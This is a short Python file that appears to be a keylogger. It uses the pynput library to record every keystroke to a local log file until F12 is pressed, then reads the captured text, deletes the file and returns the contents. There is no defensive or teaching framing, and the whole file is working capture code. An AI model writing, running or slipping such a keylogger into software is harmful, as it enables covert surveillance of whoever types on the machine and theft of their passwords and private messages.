import os
from pynput.keyboard import Listener


def on_press(key):
    key = str(key)
    key = key.replace("'","")
    if key == "Key.f12":
        raise SystemExit(0)
    with open("log.txt","a") as file:
        file.write(key)
        file.write(' ')
    #print(key)

def keylogThread():
    with Listener(on_press=on_press) as listener:
        listener.join()
        
def start_keylog():
    keylogThread()
    with open('log.txt','r') as file:
        res = file.read()
    os.remove('log.txt')
    return res
